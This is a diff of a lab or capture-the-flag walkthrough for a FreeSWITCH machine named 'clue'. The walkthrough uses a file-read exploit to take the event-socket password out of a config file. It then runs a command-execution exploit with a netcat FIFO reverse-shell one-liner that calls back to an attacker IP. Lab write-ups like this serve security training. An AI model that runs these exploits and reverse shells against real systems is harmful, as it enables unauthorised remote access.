@@ -57,7 +57,24 @@ cat 47799.txt
 #
 # nt authority\system
 ```
-run the script with reverse shell command
+but we need to password first    
+since we can login ssh we can see find the password file in freeswitch directory      
+after a bit of research on goole    
+it says the password location is the default path of this configuration file is   /etc/freeswitch/autoload_configs/event_socket.conf.xml    
+the passowrd is StrongClueConEight021  
+```
+$ python3 49362.py 192.168.156.240 /etc/freeswitch/autoload_configs/event_socket.conf.xml
+
+<configuration name="event_socket.conf" description="Socket Client">
+  <settings>
+    <param name="nat-map" value="false"/>
+    <param name="listen-ip" value="0.0.0.0"/>
+    <param name="listen-port" value="8021"/>
+    <param name="password" value="StrongClueConEight021"/>
+  </settings>
+</configuration>
+```
+change the password in the script and run it with reverse shell command
 ```
 $ python3 47799.py 192.168.156.240 "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.157 80 >/tmp/f"
 ```
@@ -68,15 +85,5 @@ connect to [192.168.45.157] from (UNKNOWN) [192.168.156.240] 48970
 freeswitch@clue:/$ id
 uid=998(freeswitch) gid=998(freeswitch) groups=998(freeswitch)
 ```
-```
-freeswitch@clue:/etc/freeswitch/autoload_configs$ cat event_socket.conf.xml
-cat event_socket.conf.xml
-<configuration name="event_socket.conf" description="Socket Client">
-  <settings>
-    <param name="nat-map" value="false"/>
-    <param name="listen-ip" value="0.0.0.0"/>
-    <param name="listen-port" value="8021"/>
-    <param name="password" value="StrongClueConEight021"/>
-  </settings>
-</configuration>
-```
+## Privlege Escalation
+
